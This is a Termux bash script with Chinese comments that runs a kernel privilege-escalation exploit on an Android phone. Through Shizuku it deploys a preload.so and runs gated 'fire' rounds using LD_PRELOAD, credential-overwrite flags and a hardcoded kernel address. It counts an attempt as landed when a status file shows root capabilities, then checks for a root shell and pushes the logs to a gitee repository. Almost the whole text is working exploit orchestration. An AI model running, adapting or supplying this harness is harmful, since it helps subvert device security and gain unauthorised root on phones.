#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse 现场全自动脚本 v3 (评审维护, 零判断执行)
# 用法: Termux 里 `bash field_auto.sh`
# v3: 取证阶段(卡死线程 wchan 定罪) / 删除验证堵陈旧门槛洞 /
#     轮间负载闸(R8 类污染轮不再连打) / 重试提示改 stderr /
#     C1 只在实际开火后收集 / 缺 rc 行标记 CONTAMINATED
# ============================================================
set -u
TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
if [ -n "$TOKEN" ]; then
  REPO_URL="https://ihamn:${TOKEN}@gitee.com/ihamn/matisse.git"
else
  REPO_URL="https://gitee.com/ihamn/matisse.git"
  echo "[card] 警告: 无令牌文件, 回传推送会失败(拉取/开火不受影响)"
fi
WORK="$HOME/matisse"
RUN_TS=$(date +%Y%m%d_%H%M%S)
CONSOLE_LOG="$HOME/card_console_${RUN_TS}.log"
PUSHED=0; EXTRA=""; R9_GATE=""; R10_GATE=""; C1_FIRED=0; R10_FIRED=0
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[card] $*"; }
SHIZUKU_DEAD_HINT="!! Shizuku 连接不稳定。手机上做一次(只需一次): 设置->应用管理->Termux和Shizuku->省电策略都改[无限制], 运行期间插充电器+亮屏, 然后重新粘贴运行本脚本"

# ---------- 0. git + 仓库 ----------
say "第0步: 准备 git 和仓库"
command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1 || { say "git 安装失败,检查网络"; exit 1; }
[ -d "$WORK/.git" ] || git clone -q "$REPO_URL" "$WORK" || { say "克隆失败,检查网络"; exit 1; }
cd "$WORK" || exit 1
git remote set-url origin "$REPO_URL"
git config user.name "field-termux"; git config user.email "field@termux.local"
git pull -q origin master 2>/dev/null || true
say "仓库就绪: $(git log --oneline -1 | cut -c1-70)"

# ---------- 1. rish ----------
say "第1步: 查找 rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "$HOME/storage/downloads/rish" \
         "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "/data/local/tmp/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
if [ -z "$RISH" ]; then
  say "!! 没找到 rish: Shizuku app->终端应用中使用(rish)->复制到 Download; Termux 执行 termux-setup-storage; cp /sdcard/Download/rish* ~/ ; chmod +x ~/rish*; 重跑"
  exit 2
fi
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
RISH_MODE=""
TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_\$(id -u)") 2>&1 )
printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
if [ -z "$RISH_MODE" ]; then
  TEST_B=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 30 ./rish) 2>&1 )
  printf '%s' "$TEST_B" | grep -q "RISH_OK_" && RISH_MODE=stdin && RISH_OUT="$TEST_B"
fi
[ -z "$RISH_MODE" ] && { say "!! rish 无法执行(Shizuku 没在运行?)输出: $TEST_A"; exit 2; }
say "rish 模式: $RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
rsh1(){ local cmd="$1" t="${2:-60}"
  if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
  else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }

# ---------- 2. 部署 mt60 (SHA 机器校验) ----------
say "第2步: 部署 mt60 preload.so 并校验 SHA256"
[ -f "$WORK/bin/mt60/preload.so" ] || { say "!! 仓库里没有 bin/mt60/preload.so"; exit 3; }
SHA_EXP=$(grep -o '[0-9a-f]\{64\}' "$WORK/bin/mt60/BUILD_INFO.txt" 2>/dev/null | head -1)
rsh "rm -f /data/local/tmp/preload.new" 20 >/dev/null
rpush "$WORK/bin/mt60/preload.so" "/data/local/tmp/preload.new" >/dev/null
rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
say "期望 SHA: ${SHA_EXP:-未知}"; say "实际 SHA: ${SHA_GOT:-读取失败}"
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *Request\ timeout*|*"blocked"*) say "$SHIZUKU_DEAD_HINT";; *) say "!! SHA 不一致,中止开火(防错二进制)";; esac
  exit 3
fi
say "二进制校验通过"

# ---------- 3. 取证阶段 (零开火, R7 卡死线程定罪窗口) ----------
say "第3步: 取证 (残留进程 + 每线程 state/wchan + 负载)"
mkdir -p "$WORK/logs_raw/R9" "$WORK/logs_raw/R10" "$WORK/logs_raw/C1"
FORENSIC="$WORK/logs_raw/R9/forensic_${RUN_TS}.txt"
{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
  echo "--- residue processes ---"
  rsh "ps -A | grep -E 'sleep|preload' || echo NO_RESIDUE"
  echo "--- per-thread state/wchan of residue ---"
  rsh 'for p in $(ps -A -o PID,NAME | grep -E "sleep|preload" | awk "{print \$1}"); do echo "== pid $p =="; for t in /proc/$p/task/*; do st=$(cat $t/stat 2>/dev/null | awk "{print \$3}"); wc=$(cat $t/wchan 2>/dev/null); cm=$(cat $t/comm 2>/dev/null); echo "tid=$(basename $t) comm=$cm state=$st wchan=$wc"; done; done' 60
} > "$FORENSIC" 2>&1
RESIDUE_FLAG=$(grep -c "state=" "$FORENSIC" 2>/dev/null || echo 0)
say "取证落盘: $FORENSIC (线程行数=$RESIDUE_FLAG)"
STUCK_STATES=$(grep -o "state=[DR]" "$FORENSIC" | wc -l)
if [ "$RESIDUE_FLAG" -gt 0 ]; then
  say "!! 发现残留进程 (线程 $RESIDUE_FLAG 条, D/R 态 $STUCK_STATES 条)"
  say "取证已保存。请现在重启手机 (长按电源->重启), 等 10 分钟后重新粘贴运行本脚本"
  cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
  git add -A >/dev/null 2>&1; git commit -q -m "v3 forensics ${RUN_TS}: residue found (threads=$RESIDUE_FLAG D/R=$STUCK_STATES) - reboot requested before fire" >/dev/null 2>&1 || true
  for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && break; sleep 10; done
  exit 5
fi
say "无残留, 继续"

# ---------- 4. 体检 (自动等到 settle) ----------
say "第4步: 体检三旗 (新 boot 会自动等满 10 分钟)"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
case "$BOOT0" in *Request\ timeout*|*"blocked"*|"") say "$SHIZUKU_DEAD_HINT"; exit 4;; esac
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
while :; do
  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
  case "$UP" in ''|*[!0-9]*) say "uptime 读数异常"; sleep 10; continue;; esac
  [ "$UP" -ge 600 ] && break
  WAIT_S=$((600 - UP)); say "开机仅 ${UP}s, 再等 ${WAIT_S}s ..."; sleep $((WAIT_S > 120 ? 120 : WAIT_S))
done
say "boot=$BOOT0 enforce=$ENF0 settle=OK"
LOADWAIT_N=0; GARBAGE_N=0
while :; do
  LOAD=$(rsh "awk '{print (\$1<3)?\"LOAD_GO\":\"LOAD_WAIT\"}' /proc/loadavg" 20 | tr -d '\r')
  if [ "$LOAD" != "LOAD_GO" ] && [ "$LOAD" != "LOAD_WAIT" ]; then
    GARBAGE_N=$((GARBAGE_N+1)); [ "$GARBAGE_N" -ge 2 ] && { say "$SHIZUKU_DEAD_HINT"; exit 4; }
    say "读数异常, 10秒后重读..."; sleep 10; continue
  fi
  say "load=$LOAD (第${LOADWAIT_N}次等待)"
  [ "$LOAD" = "LOAD_GO" ] && break
  LOADWAIT_N=$((LOADWAIT_N+1)); [ "$LOADWAIT_N" -ge 3 ] && { say "裁定: 照打(评审附录A)"; break; }
  say "负载真高, 等3分钟再试..."; sleep 180
done
say "体检完成,开始开火"

# ---------- 5. 开火 / 门槛 / 分支 ----------
cleangate(){ local i
  for i in 1 2 3 4; do
    rsh "rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt" 20 >/dev/null
    GONE=$(rsh "ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$GONE" = "0" ] && return 0
    say "门槛文件未删净(残留 $GONE), 重试 $i..."
  done
  return 1; }
fire(){ local name="$1" stage="$2" task="$3" te="" rc_line
  [ -n "$task" ] && te=" PSELECT_TASK=$task"
  cleangate || { say "!! $name 门槛文件删不净, 弃打本轮(防陈旧误判)"; return 1; }
  rsh1 "am kill-all" 20 >/dev/null
  local cmd="timeout 220 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"${name}_RC=\$?\""
  say "开火 $name (约4分钟,请勿动手机,保持亮屏)..."
  rc_line=$(rsh1 "$cmd" 250 | grep -a "_RC=" | tail -1)
  if [ -z "$rc_line" ]; then
    say "!! $name 未返回 rc 行 (外层超时击杀) -> 标记 CONTAMINATED"
    EXTRA="$EXTRA ${name}=CONTAMINATED"
  else
    say "$rc_line enforce=$(rsh 'getenforce' 20 | tr -d '\r')"
  fi; }
gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
  if [ -z "$st" ] || ! printf '%s' "$st" | grep -q "task="; then echo "R_MISS"; return; fi
  if printf '%s' "$st" | grep -q "CapEff=0000000000000000"; then echo "R_MISS"; else echo "R_LANDED"; fi; }
gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r'; }
loadgo(){ rsh "awk '{print (\$1<3)?\"LOAD_GO\":\"LOAD_WAIT\"}' /proc/loadavg" 20 | tr -d '\r'; }

fire R9 R ""
R9_GATE=$(gate); say "R9 门槛判定: $R9_GATE"
BOOT1=$(bootid)
if [ "$R9_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
  T=$(gettask); say "R 写落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
elif [ "$BOOT1" != "$BOOT0" ]; then
  say "boot 变化, 停止后续轮"; EXTRA="$EXTRA boot_changed"
else
  LOAD2=$(loadgo); say "轮间负载闸: $LOAD2"
  if [ "$LOAD2" = "LOAD_GO" ]; then
    say "R_MISS 且负载绿, 重掷 R10 (最后一轮)"; R10_FIRED=1; fire R10 R ""
    R10_GATE=$(gate); say "R10 门槛判定: $R10_GATE"
    BOOT2=$(bootid)
    if [ "$R10_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
      T=$(gettask); say "R10 落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
    else
      say "两轮未中,按卡停止"; EXTRA="$EXTRA two_miss_stopped"
    fi
  else
    say "轮间负载高 (疑似卡死线程占核) -> 不打第二轮, 保设备干净"; EXTRA="$EXTRA inter_round_load_stop"
  fi
fi

# ---------- 6. 回收 + 回传 ----------
say "第6步: 回收数据并回传"
for n in R9 R10; do
  rsh "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/$n/${n}_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/$n/${n}_raw.out" ] || rm -f "$WORK/logs_raw/$n/${n}_raw.out"
done
if [ "$C1_FIRED" = 1 ]; then
  rsh "cat /data/local/tmp/C1.out" 60 > "$WORK/logs_raw/C1/C1_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/C1/C1_raw.out" ] || rm -f "$WORK/logs_raw/C1/C1_raw.out"
  { rsh "cat /data/local/tmp/root_alive.txt" 20 2>/dev/null; } > "$WORK/logs_raw/C1/root_alive.txt" 2>/dev/null
fi
rsh "cat /data/local/tmp/mt49_child_status.txt" 30 > "$WORK/logs_raw/R9/mt49_status_final.txt" 2>/dev/null
rsh "dumpsys dropbox --print data_app_anr 2>/dev/null | tail -c 200000" 60 > "$WORK/logs_raw/anr_dropbox_${RUN_TS}.txt" 2>/dev/null
ALIVE=$(rsh "getenforce; cat /proc/sys/kernel/random/boot_id; cat /proc/loadavg" 20 | tr -d '\r' | tr '\n' ' ')
say "结束活体: $ALIVE"
SIG_GREP=$(grep -a "pselect returned\|mt19b\|sched_ok\|canary planted\|mt25: futex trigger 0" "$WORK/logs_raw/R9/R9_raw.out" 2>/dev/null | head -8)
{ echo "# 卡5 Termux 自动运行 v3 $RUN_TS"
  echo "- 取证: 线程行=$RESIDUE_FLAG (D/R=$STUCK_STATES)"
  echo "- 开火前: boot=$BOOT0 enforce=$ENF0"
  echo "- R9门槛: $R9_GATE / R10门槛: ${R10_GATE:-未跑} / C1开打: $C1_FIRED / $EXTRA"
  echo "- consumer 签名行 (last_sched_ret 判别器):"; echo "$SIG_GREP"
  echo "- 结束活体: $ALIVE"
} > "$WORK/logs_raw/CARD5_TERMUX_${RUN_TS}.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
git add -A >/dev/null 2>&1
git commit -q -m "termux auto card5-v3 ${RUN_TS}: R9=${R9_GATE} R10=${R10_GATE:-skip} C1=$C1_FIRED$EXTRA (forensics+single/dual gated rounds)" || true
for i in 1 2 3; do
  git pull -q --rebase origin master 2>/dev/null
  git push -q origin master 2>/dev/null && { PUSHED=1; break; }
  say "推送重试 $i..."; sleep 10
done
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
if [ "$PUSHED" = 1 ]; then
  say "完成! 全部数据已推回 gitee 仓库"
else
  say "推送失败! 把这个文件发给评审: $CONSOLE_LOG"
fi
